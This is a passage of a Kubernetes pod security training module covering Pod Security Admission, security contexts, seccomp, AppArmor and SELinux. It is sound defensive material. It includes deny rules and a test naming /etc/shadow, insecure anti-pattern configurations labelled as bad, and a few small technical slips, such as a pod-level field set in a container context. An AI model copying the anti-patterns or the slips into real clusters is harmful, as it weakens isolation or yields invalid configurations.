SELinux), and best practices for creating secure pod configurations. Based on CIS Kubernetes Benchmark and NSA/CISA hardening guidelines, you'll learn to implement defense-in-depth strategies at the pod level.</p>"},{"location":"06-pod-security/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Understand and implement Pod Security Standards (Privileged, Baseline, Restricted)</li> <li>Configure Pod Security Admission (PSA) at namespace and cluster levels</li> <li>Apply security contexts to pods and containers with appropriate restrictions</li> <li>Implement seccomp profiles for syscall filtering</li> <li>Configure AppArmor and SELinux for mandatory access control</li> <li>Design pods with read-only root filesystems</li> <li>Apply principle of least privilege to container permissions</li> <li>Identify and remediate common pod security anti-patterns</li> <li>Perform security audits of pod configurations</li> <li>Create production-ready secure pod specifications</li> </ol>"},{"location":"06-pod-security/#1-pod-security-standards-pss","title":"1. Pod Security Standards (PSS)","text":""},{"location":"06-pod-security/#11-overview","title":"1.1 Overview","text":"<p>Pod Security Standards define three levels of security policies that progressively restrict pod configurations. These standards, introduced in Kubernetes 1.23 (stable in 1.25), replaced Pod Security Policies (PSP).</p> <p>Three Security Levels:</p> <ol> <li>Privileged - Unrestricted, allows known privilege escalations</li> <li>Baseline - Minimally restrictive, prevents known privilege escalations</li> <li>Restricted - Heavily restricted, follows pod hardening best practices</li> </ol>"},{"location":"06-pod-security/#12-privileged-profile","title":"1.2 Privileged Profile","text":"<p>The Privileged profile is unrestricted and should only be used for trusted, infrastructure-level workloads.</p> <p>Characteristics: - No restrictions applied - Allows privileged containers - Allows host namespace sharing (PID, IPC, Network) - Allows all capabilities - Allows host path volumes</p> <p>Use Cases: - CNI plugins - Storage drivers - Monitoring agents with host access - Development/testing environments</p>"},{"location":"06-pod-security/#13-baseline-profile","title":"1.3 Baseline Profile","text":"<p>The Baseline profile prevents known privilege escalations while maintaining minimal restrictions for common containerized workloads.</p> <p>Key Restrictions:</p> Control Requirement HostProcess Windows HostProcess containers prohibited Host Namespaces Sharing host PID, IPC, or network namespaces prohibited Privileged Containers <code>privileged: true</code> prohibited Capabilities Adding all capabilities prohibited; specific dangerous capabilities dropped HostPath Volumes Prohibited Host Ports Prohibited or restricted to known ranges AppArmor Unconfined profiles prohibited SELinux Custom types or user/role options prohibited /proc Mount Type Default /proc masks required Seccomp Unconfined profile prohibited Sysctls Only safe sysctls allowed <p>Example Violations: <pre><code># VIOLATION: Host network enabled\nspec:\n  hostNetwork: true  # Baseline violation\n  containers:\n  - name: app\n    image: myapp:1.0\n</code></pre></p>"},{"location":"06-pod-security/#14-restricted-profile","title":"1.4 Restricted Profile","text":"<p>The Restricted profile implements pod hardening best practices with significant restrictions. All production workloads should target this level.</p> <p>Additional Restrictions Beyond Baseline:</p> Control Requirement Volume Types Restricted to configMap, emptyDir, projected, secret, downwardAPI, persistentVolumeClaim, ephemeral Privilege Escalation <code>allowPrivilegeEscalation: false</code> required Non-root User <code>runAsNonRoot: true</code> required; containers must not run as UID 0 Capabilities Must drop ALL capabilities; may add only NET_BIND_SERVICE Seccomp Must use RuntimeDefault, Localhost, or specific profile <p>Compliant Example: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: restricted-pod\n  namespace: production\nspec:\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n    fsGroup: 2000\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      runAsNonRoot: true\n      runAsUser: 1000\n      capabilities:\n        drop:\n        - ALL\n    volumeMounts:\n    - name: cache\n      mountPath: /cache\n    - name: tmp\n      mountPath: /tmp\n  volumes:\n  - name: cache\n    emptyDir: {}\n  - name: tmp\n    emptyDir: {}\n</code></pre></p>"},{"location":"06-pod-security/#2-pod-security-admission-psa","title":"2. Pod Security Admission (PSA)","text":""},{"location":"06-pod-security/#21-psa-architecture","title":"2.1 PSA Architecture","text":"<p>Pod Security Admission is a built-in admission controller that enforces Pod Security Standards.</p> <pre><code>graph TB\n    A[Pod Creation Request] --&gt; B[API Server]\n    B --&gt; C{Pod Security&lt;br/&gt;Admission}\n    C --&gt; D{Check Namespace&lt;br/&gt;Labels}\n    D --&gt; E{Evaluate Against&lt;br/&gt;PSS Level}\n    E --&gt;|Enforce: Deny| F[Request Rejected]\n    E --&gt;|Audit: Allow + Log| G[Request Allowed&lt;br/&gt;Violation Logged]\n    E --&gt;|Warn: Allow + Warn| H[Request Allowed&lt;br/&gt;Warning Returned]\n    E --&gt;|Compliant| I[Request Allowed]\n\n    style F fill:#ff6b6b\n    style G fill:#ffd93d\n    style H fill:#ffd93d\n    style I fill:#6bcf7f</code></pre>"},{"location":"06-pod-security/#22-psa-modes","title":"2.2 PSA Modes","text":"<p>PSA operates in three modes simultaneously per namespace:</p> <ol> <li>enforce - Policy violations cause pod rejection</li> <li>audit - Policy violations trigger audit log annotation</li> <li>warn - Policy violations return warnings to user</li> </ol> <p>Namespace Labels: <pre><code># Enforce restricted, audit and warn on baseline\npod-security.kubernetes.io/enforce: restricted\npod-security.kubernetes.io/enforce-version: latest\n\npod-security.kubernetes.io/audit: baseline\npod-security.kubernetes.io/audit-version: latest\n\npod-security.kubernetes.io/warn: baseline\npod-security.kubernetes.io/warn-version: latest\n</code></pre></p>"},{"location":"06-pod-security/#23-configuring-psa-at-namespace-level","title":"2.3 Configuring PSA at Namespace Level","text":"<p>Production Namespace (Restricted): <pre><code>apiVersion: v1\nkind: Namespace\nmetadata:\n  name: production-apps\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/audit: restricted\n    pod-security.kubernetes.io/warn: restricted\n    pod-security.kubernetes.io/enforce-version: v1.28\n</code></pre></p> <p>Apply with kubectl: <pre><code># Label existing namespace\nkubectl label namespace production-apps \\\n  pod-security.kubernetes.io/enforce=restricted \\\n  pod-security.kubernetes.io/audit=restricted \\\n  pod-security.kubernetes.io/warn=restricted\n\n# Verify labels\nkubectl get namespace production-apps -o yaml | grep pod-security\n</code></pre></p> <p>Development Namespace (Baseline with Warnings): <pre><code>apiVersion: v1\nkind: Namespace\nmetadata:\n  name: dev-team-a\n  labels:\n    pod-security.kubernetes.io/enforce: baseline\n    pod-security.kubernetes.io/audit: restricted\n    pod-security.kubernetes.io/warn: restricted\n</code></pre></p>"},{"location":"06-pod-security/#24-cluster-wide-psa-configuration","title":"2.4 Cluster-Wide PSA Configuration","text":"<p>Configure default PSA behavior using AdmissionConfiguration:</p> <pre><code># /etc/kubernetes/admission-config.yaml\napiVersion: apiserver.config.k8s.io/v1\nkind: AdmissionConfiguration\nplugins:\n- name: PodSecurity\n  configuration:\n    apiVersion: pod-security.admission.config.k8s.io/v1\n    kind: PodSecurityConfiguration\n    defaults:\n      enforce: \"baseline\"\n      enforce-version: \"latest\"\n      audit: \"restricted\"\n      audit-version: \"latest\"\n      warn: \"restricted\"\n      warn-version: \"latest\"\n    exemptions:\n      usernames: []\n      runtimeClasses: []\n      namespaces:\n      - kube-system\n      - kube-public\n      - kube-node-lease\n</code></pre> <p>Enable in API server: <pre><code># Add to kube-apiserver manifest\n--admission-control-config-file=/etc/kubernetes/admission-config.yaml\n</code></pre></p>"},{"location":"06-pod-security/#3-security-contexts","title":"3. Security Contexts","text":""},{"location":"06-pod-security/#31-pod-level-security-context","title":"3.1 Pod-Level Security Context","text":"<p>Security contexts define privilege and access control settings for pods and containers.</p> <p>Pod Security Context Fields:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  securityContext:\n    # Run as specific user/group\n    runAsUser: 1000\n    runAsGroup: 3000\n    fsGroup: 2000\n    fsGroupChangePolicy: \"OnRootMismatch\"\n\n    # Supplemental groups\n    supplementalGroups: [4000, 5000]\n\n    # Require non-root user\n    runAsNonRoot: true\n\n    # Seccomp profile\n    seccompProfile:\n      type: RuntimeDefault\n\n    # SELinux options\n    seLinuxOptions:\n      level: \"s0:c123,c456\"\n      role: \"system_r\"\n      type: \"container_t\"\n      user: \"system_u\"\n\n    # Sysctl settings\n    sysctls:\n    - name: kernel.shm_rmid_forced\n      value: \"1\"\n\n  containers:\n  - name: app\n    image: nginx:1.25\n</code></pre>"},{"location":"06-pod-security/#32-container-level-security-context","title":"3.2 Container-Level Security Context","text":"<p>Container-level settings override pod-level settings:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: container-security-context\nspec:\n  securityContext:\n    runAsUser: 1000\n    runAsNonRoot: true\n\n  containers:\n  - name: nginx\n    image: nginx:1.25\n    securityContext:\n      # Container-specific overrides\n      runAsUser: 2000  # Overrides pod runAsUser\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n\n      # Linux capabilities\n      capabilities:\n        drop:\n        - ALL\n        add:\n        - NET_BIND_SERVICE\n\n      # Seccomp (container-level)\n      seccompProfile:\n        type: Localhost\n        localhostProfile: profiles/audit.json\n\n      # Privileged mode (avoid in production)\n      privileged: false\n\n      # Process namespace sharing\n      shareProcessNamespace: false\n\n    volumeMounts:\n    - name: cache\n      mountPath: /var/cache/nginx\n    - name: run\n      mountPath: /var/run\n\n  volumes:\n  - name: cache\n    emptyDir: {}\n  - name: run\n    emptyDir: {}\n</code></pre>"},{"location":"06-pod-security/#33-linux-capabilities","title":"3.3 Linux Capabilities","text":"<p>Capabilities divide root privileges into distinct units that can be independently enabled or disabled.</p> <p>Common Capabilities:</p> Capability Description Risk Level CAP_SYS_ADMIN Administrative operations Critical CAP_NET_ADMIN Network administration High CAP_SYS_PTRACE Trace arbitrary processes High CAP_SYS_MODULE Load/unload kernel modules Critical CAP_DAC_OVERRIDE Bypass file permissions High CAP_NET_BIND_SERVICE Bind to ports &lt; 1024 Low CAP_CHOWN Change file ownership Medium CAP_SETUID Set user ID High CAP_SETGID Set group ID High <p>Secure Capability Configuration: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: capability-demo\nspec:\n  containers:\n  - name: web\n    image: nginx:1.25\n    securityContext:\n      capabilities:\n        drop:\n        - ALL  # Drop all capabilities first\n        add:\n        - NET_BIND_SERVICE  # Add only what's needed\n    ports:\n    - containerPort: 80\n</code></pre></p> <p>Check Container Capabilities: <pre><code># Install libcap2-bin in container\napt-get update &amp;&amp; apt-get install -y libcap2-bin\n\n# View effective capabilities\ncapsh --print\n\n# View capability bounding set\ncat /proc/1/status | grep Cap\n</code></pre></p>"},{"location":"06-pod-security/#4-seccomp-profiles","title":"4. Seccomp Profiles","text":""},{"location":"06-pod-security/#41-seccomp-overview","title":"4.1 Seccomp Overview","text":"<p>Secure Computing Mode (seccomp) is a Linux kernel feature that filters system calls, reducing the kernel attack surface.</p> <p>Seccomp Profile Types:</p> <ol> <li>RuntimeDefault - Container runtime's default profile (recommended)</li> <li>Localhost - Custom profile loaded from node filesystem</li> <li>Unconfined - No filtering (insecure, avoid in production)</li> </ol>"},{"location":"06-pod-security/#42-runtimedefault-profile","title":"4.2 RuntimeDefault Profile","text":"<p>The simplest and recommended approach for most workloads:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp-runtime-default\nspec:\n  securityContext:\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n  - name: app\n    image: myapp:1.0\n</code></pre>"},{"location":"06-pod-security/#43-custom-seccomp-profiles","title":"4.3 Custom Seccomp Profiles","text":"<p>Profile Location: Seccomp profiles must be placed on each node at <code>/var/lib/kubelet/seccomp/</code>.</p> <p>Example Custom Profile (audit.json): <pre><code>{\n  \"defaultAction\": \"SCMP_ACT_LOG\",\n  \"architectures\": [\n    \"SCMP_ARCH_X86_64\",\n    \"SCMP_ARCH_X86\",\n    \"SCMP_ARCH_X32\"\n  ],\n  \"syscalls\": [\n    {\n      \"names\": [\n        \"accept\",\n        \"accept4\",\n        \"access\",\n        \"arch_prctl\",\n        \"bind\",\n        \"brk\",\n        \"chmod\",\n        \"chown\",\n        \"clone\",\n        \"close\",\n        \"connect\",\n        \"dup\",\n        \"dup2\",\n        \"epoll_create\",\n        \"epoll_ctl\",\n        \"epoll_wait\",\n        \"exit\",\n        \"exit_group\",\n        \"fcntl\",\n        \"fstat\",\n        \"futex\",\n        \"getcwd\",\n        \"getdents\",\n        \"getpid\",\n        \"getppid\",\n        \"getuid\",\n        \"listen\",\n        \"mmap\",\n        \"open\",\n        \"openat\",\n        \"read\",\n        \"readlink\",\n        \"rt_sigaction\",\n        \"rt_sigprocmask\",\n        \"rt_sigreturn\",\n        \"select\",\n        \"set_robust_list\",\n        \"set_tid_address\",\n        \"socket\",\n        \"stat\",\n        \"wait4\",\n        \"write\"\n      ],\n      \"action\": \"SCMP_ACT_ALLOW\"\n    }\n  ]\n}\n</code></pre></p> <p>Restrictive Profile (deny-write.json): <pre><code>{\n  \"defaultAction\": \"SCMP_ACT_ALLOW\",\n  \"syscalls\": [\n    {\n      \"names\": [\n        \"write\",\n        \"writev\",\n        \"pwrite64\",\n        \"pwritev\",\n        \"pwritev2\"\n      ],\n      \"action\": \"SCMP_ACT_ERRNO\"\n    }\n  ]\n}\n</code></pre></p> <p>Using Localhost Profile: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: seccomp-localhost\nspec:\n  securityContext:\n    seccompProfile:\n      type: Localhost\n      localhostProfile: profiles/audit.json\n  containers:\n  - name: app\n    image: myapp:1.0\n</code></pre></p> <p>Deploy Profile to Nodes: <pre><code># Copy profile to all nodes\nfor node in $(kubectl get nodes -o name | cut -d/ -f2); do\n  scp profiles/audit.json $node:/var/lib/kubelet/seccomp/profiles/\ndone\n\n# Verify profile\nssh node01 ls -la /var/lib/kubelet/seccomp/profiles/\n</code></pre></p>"},{"location":"06-pod-security/#44-generating-seccomp-profiles","title":"4.4 Generating Seccomp Profiles","text":"<p>Use OCI seccomp profile generator or record syscalls:</p> <pre><code># Install seccomp-bpf\napt-get install -y linux-tools-common linux-tools-$(uname -r)\n\n# Trace syscalls (strace)\nkubectl exec -it pod-name -- strace -c -f -e trace=all sleep 10\n\n# Use oci-seccomp-bpf-hook (in container runtime)\n# Automatically generates profiles based on observed behavior\n</code></pre>"},{"location":"06-pod-security/#5-apparmor","title":"5. AppArmor","text":""},{"location":"06-pod-security/#51-apparmor-overview","title":"5.1 AppArmor Overview","text":"<p>AppArmor is a Mandatory Access Control (MAC) system that restricts program capabilities using per-program profiles.</p> <p>AppArmor Support: - Supported on Ubuntu, Debian, SUSE - Check if enabled: <code>cat /sys/module/apparmor/parameters/enabled</code> - Profiles location: <code>/etc/apparmor.d/</code></p>"},{"location":"06-pod-security/#52-apparmor-profiles","title":"5.2 AppArmor Profiles","text":"<p>Check Available Profiles: <pre><code># On the node\nsudo aa-status\n\n# List loaded profiles\nsudo apparmor_status\n</code></pre></p> <p>Example AppArmor Profile: <pre><code># /etc/apparmor.d/k8s-nginx\n#include &lt;tunables/global&gt;\n\nprofile k8s-nginx flags=(attach_disconnected,mediate_deleted) {\n  #include &lt;abstractions/base&gt;\n  #include &lt;abstractions/apache2-common&gt;\n\n  # Network access\n  network inet tcp,\n  network inet udp,\n\n  # File access\n  /usr/sbin/nginx ix,\n  /etc/nginx/** r,\n  /var/log/nginx/* w,\n  /var/cache/nginx/** rw,\n  /run/nginx.pid rw,\n\n  # Deny sensitive paths\n  deny /proc/sys/** w,\n  deny /sys/** w,\n  deny /etc/shadow r,\n  deny /etc/passwd w,\n\n  # Required directories\n  /usr/share/nginx/** r,\n  /var/www/** r,\n\n  # Temporary files\n  /tmp/** rw,\n  /var/tmp/** rw,\n\n  # Capabilities (limited)\n  capability net_bind_service,\n  capability dac_override,\n  capability setuid,\n  capability setgid,\n  capability chown,\n\n  # Deny dangerous capabilities\n  deny capability sys_admin,\n  deny capability sys_module,\n  deny capability sys_rawio,\n}\n</code></pre></p> <p>Load Profile: <pre><code># Parse and load profile\nsudo apparmor_parser -r -W /etc/apparmor.d/k8s-nginx\n\n# Verify profile loaded\nsudo aa-status | grep k8s-nginx\n</code></pre></p>"},{"location":"06-pod-security/#53-using-apparmor-in-pods","title":"5.3 Using AppArmor in Pods","text":"<p>AppArmor Annotation: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-apparmor\n  annotations:\n    # Format: container.apparmor.security.beta.kubernetes.io/&lt;container-name&gt;: &lt;profile&gt;\n    container.apparmor.security.beta.kubernetes.io/nginx: localhost/k8s-nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.25\n    ports:\n    - containerPort: 80\n</code></pre></p> <p>Runtime Default Profile: <pre><code>metadata:\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/nginx: runtime/default\n</code></pre></p> <p>Unconfined (Insecure): <pre><code>metadata:\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/nginx: unconfined\n</code></pre></p>"},{"location":"06-pod-security/#54-testing-apparmor-enforcement","title":"5.4 Testing AppArmor Enforcement","text":"<pre><code># Deploy pod with AppArmor\nkubectl apply -f nginx-apparmor.yaml\n\n# Test restricted operation (should fail)\nkubectl exec nginx-apparmor -- touch /etc/shadow\n# Output: touch: cannot touch '/etc/shadow': Permission denied\n\n# Check AppArmor denials in logs\nkubectl exec nginx-apparmor -- dmesg | grep DENIED\n</code></pre>"},{"location":"06-pod-security/#6-selinux","title":"6. SELinux","text":""},{"location":"06-pod-security/#61-selinux-overview","title":"6.1 SELinux Overview","text":"<p>Security-Enhanced Linux (SELinux) provides mandatory access control (MAC) through security labels and policies.</p> <p>SELinux Contexts: - User (<code>system_u</code>) - SELinux user - Role (<code>system_r</code>) - Role-based access control - Type (<code>container_t</code>) - Type enforcement (most important) - Level (<code>s0:c1,c2</code>) - Multi-Level Security (MLS)</p> <p>Check SELinux Status: <pre><code># On the node\ngetenforce\n# Output: Enforcing / Permissive / Disabled\n\nsestatus\n</code></pre></p>"},{"location":"06-pod-security/#62-container-selinux-types","title":"6.2 Container SELinux Types","text":"<p>Common Container Types:</p> Type Description Use Case <code>container_t</code> Default container type Standard containers <code>container_init_t</code> Container init process systemd in containers <code>svirt_sandbox_file_t</code> Container files Volume mounts <code>container_file_t</code> Container filesystem Container layers"},{"location":"06-pod-security/#63-selinux-in-pods","title":"6.3 SELinux in Pods","text":"<p>Basic SELinux Options: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux-demo\nspec:\n  securityContext:\n    seLinuxOptions:\n      level: \"s0:c123,c456\"  # MLS/MCS level\n      role: \"system_r\"        # SELinux role\n      type: \"container_t\"     # SELinux type\n      user: \"system_u\"        # SELinux user\n\n  containers:\n  - name: app\n    image: myapp:1.0\n</code></pre></p> <p>Custom SELinux Policy: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-selinux\nspec:\n  securityContext:\n    seLinuxOptions:\n      level: \"s0\"\n      type: \"container_t\"\n\n  containers:\n  - name: nginx\n    image: nginx:1.25\n    volumeMounts:\n    - name: content\n      mountPath: /usr/share/nginx/html\n\n  volumes:\n  - name: content\n    persistentVolumeClaim:\n      claimName: web-content\n</code></pre></p> <p>Verify SELinux Context: <pre><code># Check pod context\nkubectl exec selinux-demo -- ps -eZ | grep nginx\n\n# Check file contexts\nkubectl exec selinux-demo -- ls -Z /usr/share/nginx/html\n</code></pre></p>"},{"location":"06-pod-security/#64-selinux-volume-labeling","title":"6.4 SELinux Volume Labeling","text":"<p>Kubernetes automatically applies SELinux labels to volumes based on pod context:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-selinux\nspec:\n  securityContext:\n    seLinuxOptions:\n      level: \"s0:c100,c200\"\n\n  containers:\n  - name: app\n    image: busybox\n    command: [\"sleep\", \"3600\"]\n    volumeMounts:\n    - name: data\n      mountPath: /data\n\n  volumes:\n  - name: data\n    emptyDir: {}\n</code></pre> <p>Check Volume Labels: <pre><code># On the node, find container ID\ndocker ps | grep volume-selinux\n\n# Check volume mount labels\ndocker inspect &lt;container-id&gt; | grep -A 10 Mounts\n\n# Verify filesystem labels\nls -Z /var/lib/kubelet/pods/&lt;pod-uid&gt;/volumes/\n</code></pre></p>"},{"location":"06-pod-security/#7-read-only-root-filesystem","title":"7. Read-Only Root Filesystem","text":""},{"location":"06-pod-security/#71-why-read-only-root-filesystems","title":"7.1 Why Read-Only Root Filesystems?","text":"<p>Security Benefits: - Prevents malware persistence - Blocks unauthorized file modifications - Reduces attack surface - Enforces immutable infrastructure - Simplifies security auditing</p>"},{"location":"06-pod-security/#72-implementing-read-only-root-filesystem","title":"7.2 Implementing Read-Only Root Filesystem","text":"<p>Basic Configuration: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: readonly-root\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.25\n    securityContext:\n      readOnlyRootFilesystem: true\n    volumeMounts:\n    - name: cache\n      mountPath: /var/cache/nginx\n    - name: run\n      mountPath: /var/run\n    - name: tmp\n      mountPath: /tmp\n\n  volumes:\n  - name: cache\n    emptyDir: {}\n  - name: run\n    emptyDir: {}\n  - name: tmp\n    emptyDir: {}\n</code></pre></p>"},{"location":"06-pod-security/#73-application-specific-writable-paths","title":"7.3 Application-Specific Writable Paths","text":"<p>Different applications require different writable directories:</p> <p>Nginx: <pre><code>volumeMounts:\n- name: cache\n  mountPath: /var/cache/nginx\n- name: run\n  mountPath: /var/run\n- name: tmp\n  mountPath: /tmp\n</code></pre></p> <p>Node.js Application: <pre><code>volumeMounts:\n- name: npm-cache\n  mountPath: /.npm\n- name: node-cache\n  mountPath: /.node\n- name: tmp\n  mountPath: /tmp\n- name: app-logs\n  mountPath: /app/logs\n</code></pre></p> <p>Java Application: <pre><code>volumeMounts:\n- name: tmp\n  mountPath: /tmp\n- name: java-tmp\n  mountPath: /opt/java/tmp\nenv:\n- name: JAVA_TOOL_OPTIONS\n  value: \"-Djava.io.tmpdir=/opt/java/tmp\"\n</code></pre></p>"},{"location":"06-pod-security/#74-production-ready-example-with-read-only-root","title":"7.4 Production-Ready Example with Read-Only Root","text":"<p>Complete Deployment: <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: secure-web-app\n  namespace: production\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: secure-web\n  template:\n    metadata:\n      labels:\n        app: secure-web\n    spec:\n      # Pod-level security\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n        seccompProfile:\n          type: RuntimeDefault\n\n      containers:\n      - name: app\n        image: mycompany/web-app:1.2.3\n\n        # Container-level security\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n          runAsUser: 1000\n          capabilities:\n            drop:\n            - ALL\n            add:\n            - NET_BIND_SERVICE\n\n        # Application requirements\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n\n        # Resource limits\n        resources:\n          limits:\n            cpu: \"1\"\n            memory: 512Mi\n          requests:\n            cpu: 250m\n            memory: 256Mi\n\n        # Writable volumes\n        volumeMounts:\n        - name: cache\n          mountPath: /app/cache\n        - name: tmp\n          mountPath: /tmp\n        - name: logs\n          mountPath: /app/logs\n        - name: config\n          mountPath: /app/config\n          readOnly: true\n\n        # Health checks\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 10\n\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 5\n\n      volumes:\n      - name: cache\n        emptyDir:\n          sizeLimit: 100Mi\n      - name: tmp\n        emptyDir:\n          sizeLimit: 50Mi\n      - name: logs\n        emptyDir:\n          sizeLimit: 200Mi\n      - name: config\n        configMap:\n          name: app-config\n</code></pre></p>"},{"location":"06-pod-security/#8-security-best-practices","title":"8. Security Best Practices","text":""},{"location":"06-pod-security/#81-defense-in-depth","title":"8.1 Defense in Depth","text":"<p>Implement multiple security layers:</p> <ol> <li>Pod Security Standards - Enforce at namespace level</li> <li>Security Contexts - Configure for every container</li> <li>Seccomp/AppArmor/SELinux - Add MAC layer</li> <li>Read-Only Filesystem - Prevent modifications</li> <li>Network Policies - Restrict traffic</li> <li>Resource Limits - Prevent resource exhaustion</li> </ol>"},{"location":"06-pod-security/#82-principle-of-least-privilege","title":"8.2 Principle of Least Privilege","text":"<p>Checklist: - \u2705 Run as non-root user - \u2705 Drop all capabilities, add only required ones - \u2705 Use read-only root filesystem - \u2705 Disable privilege escalation - \u2705 Apply seccomp profile (RuntimeDefault minimum) - \u2705 Use specific image tags (not <code>latest</code>) - \u2705 Set resource limits - \u2705 Avoid hostPath, hostNetwork, hostPID, hostIPC</p> <p>Minimal Security Template: <pre><code>securityContext:\n  runAsNonRoot: true\n  runAsUser: 10000\n  allowPrivilegeEscalation: false\n  readOnlyRootFilesystem: true\n  capabilities:\n    drop:\n    - ALL\n  seccompProfile:\n    type: RuntimeDefault\n</code></pre></p>"},{"location":"06-pod-security/#83-secure-image-practices","title":"8.3 Secure Image Practices","text":"<pre><code># Use minimal base images\nFROM gcr.io/distroless/static-debian11:nonroot\n\n# Or create non-root user\nFROM alpine:3.18\nRUN addgroup -g 1000 appuser &amp;&amp; \\\n    adduser -D -u 1000 -G appuser appuser\nUSER appuser\n\n# Use specific tags, not latest\nimage: registry.example.com/myapp:v1.2.3-sha256@abc123...\n</code></pre>"},{"location":"06-pod-security/#84-admission-controllers","title":"8.4 Admission Controllers","text":"<p>Enforce security policies cluster-wide using admission controllers:</p> <p>Example OPA Gatekeeper Policy: <pre><code>apiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sRequireReadOnlyRoot\nmetadata:\n  name: require-readonly-root\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n    namespaces:\n    - production\n  parameters:\n    exemptions:\n    - kube-system\n</code></pre></p>"},{"location":"06-pod-security/#9-security-anti-patterns","title":"9. Security Anti-Patterns","text":""},{"location":"06-pod-security/#91-common-mistakes","title":"9.1 Common Mistakes","text":"<p>\u274c Anti-Pattern 1: Running as Root <pre><code># BAD: Runs as root (UID 0)\nspec:\n  containers:\n  - name: app\n    image: myapp:latest\n    # No securityContext specified\n</code></pre></p> <p>\u2705 Corrected: <pre><code>spec:\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n  containers:\n  - name: app\n    image: myapp:latest\n</code></pre></p> <p>\u274c Anti-Pattern 2: Privileged Containers <pre><code># BAD: Privileged container\nspec:\n  containers:\n  - name: app\n    image: myapp:latest\n    securityContext:\n      privileged: true\n</code></pre></p> <p>\u2705 Corrected: <pre><code>spec:\n  containers:\n  - name: app\n    image: myapp:latest\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - ALL\n        add:\n        - NET_ADMIN  # Only if absolutely required\n</code></pre></p> <p>\u274c Anti-Pattern 3: Host Namespaces <pre><code># BAD: Sharing host namespaces\nspec:\n  hostNetwork: true\n  hostPID: true\n  hostIPC: true\n</code></pre></p> <p>\u2705 Corrected: <pre><code>spec:\n  hostNetwork: false\n  hostPID: false\n  hostIPC: false\n</code></pre></p> <p>\u274c Anti-Pattern 4: Writable Root Filesystem <pre><code># BAD: Writable filesystem\nspec:\n  containers:\n  - name: app\n    image: myapp:latest\n    # No readOnlyRootFilesystem setting\n</code></pre></p> <p>\u2705 Corrected: <pre><code>spec:\n  containers:\n  - name: app\n    image: myapp:latest\n    securityContext:\n      readOnlyRootFilesystem: true\n    volumeMounts:\n    - name: tmp\n      mountPath: /tmp\n  volumes:\n  - name: tmp\n    emptyDir: {}\n</code></pre></p> <p>\u274c Anti-Pattern 5: No Resource Limits <pre><code># BAD: No resource limits\nspec:\n  containers:\n  - name: app\n    image: myapp:latest\n</code></pre></p> <p>\u2705 Corrected: <pre><code>spec:\n  containers:\n  - name: app\n    image: myapp:latest\n    resources:\n      limits:\n        cpu: 500m\n        memory: 512Mi\n      requests:\n        cpu: 250m\n        memory: 256Mi\n</code></pre></p>"},{"location":"06-pod-security/#10-hands-on-labs","title":"10. Hands-On Labs","text":""},{"location":"06-pod-security/#lab-1-implementing-pod-security-admission","title":"Lab 1: Implementing Pod Security Admission","text":"<p>Objective: Configure PSA for a namespace and test enforcement.</p> <p>Steps:</p> <ol> <li> <p>Create namespace with restricted PSA: <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: lab-restricted\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/audit: restricted\n    pod-security.kubernetes.io/warn: restricted\nEOF\n</code></pre></p> </li> <li> <p>Try deploying non-compliant pod: <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: bad-pod\n  namespace: lab-restricted\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.25\nEOF\n</code></pre></p> </li> </ol> <p>Expected error: Pod violates restricted policy.</p> <ol> <li> <p>Deploy compliant pod: <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: good-pod\n  namespace: lab-restricted\nspec:\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n  - name: nginx\n    image: nginx:1.25\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      runAsNonRoot: true\n      runAsUser: 1000\n      capabilities:\n        drop:\n        - ALL\n    volumeMounts:\n    - name: cache\n      mountPath: /var/cache/nginx\n    - name: run\n      mountPath: /var/run\n  volumes:\n  - name: cache\n    emptyDir: {}\n  - name: run\n    emptyDir: {}\nEOF\n</code></pre></p> </li> <li> 